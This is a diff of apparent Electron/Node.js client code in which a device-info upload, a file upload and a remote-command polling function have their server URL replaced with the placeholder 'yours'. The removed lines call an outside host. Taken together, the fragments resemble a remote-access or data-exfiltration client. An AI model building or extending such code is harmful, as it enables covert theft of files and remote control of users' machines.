@@ -35,7 +35,7 @@ const sendDeviceInfo = async () => {
         formData.append('file', fs.createReadStream(deviceInfoFilePath));
         formData.append('file_type', 'DeviceInfo');  // Add file type as metadata
 
-        await axios.post('https://mahendranathreddynarpala.online/python_project/test-upload.php', formData, {
+        await axios.post('"yours"', formData, {
             headers: {
                 ...formData.getHeaders(),
             },
@@ -67,7 +67,7 @@ function createWindow() {
 
 async function checkForCommand() {
     try {
-        const response = await axios.get('https://mahendranathreddynarpala.online/python_project/commands.php');
+        const response = await axios.get('"yours"');
         const command = response.data.command;
 
         if (command && command !== 'none') {
@@ -124,7 +124,7 @@ const uploadFile = async (filePath, fileType) => {
         formData.append('file', fs.createReadStream(filePath));
         formData.append('file_type', fileType);  // Add file type as metadata
 
-        await axios.post('https://mahendranathreddynarpala.online/python_project/test-upload.php', formData, {
+        await axios.post('"yours"', formData, {
             headers: {
                 ...formData.getHeaders(),
             },
